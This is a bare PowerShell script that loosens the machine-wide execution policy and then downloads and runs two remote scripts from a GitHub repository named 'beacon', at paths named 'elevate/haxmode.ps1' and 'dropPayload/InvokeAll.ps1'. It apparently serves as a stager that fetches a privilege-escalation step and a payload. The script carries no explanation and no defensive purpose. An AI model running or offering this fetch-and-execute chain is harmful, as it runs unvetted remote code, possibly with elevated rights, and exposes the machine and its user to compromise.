Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope LocalMachine; 
Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/elevate/haxmode.ps1 > $pwd/mode.ps1; 
./mode.ps1;Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/dropPayload/InvokeAll.ps1 > $pwd/start.ps1; 
./start.ps1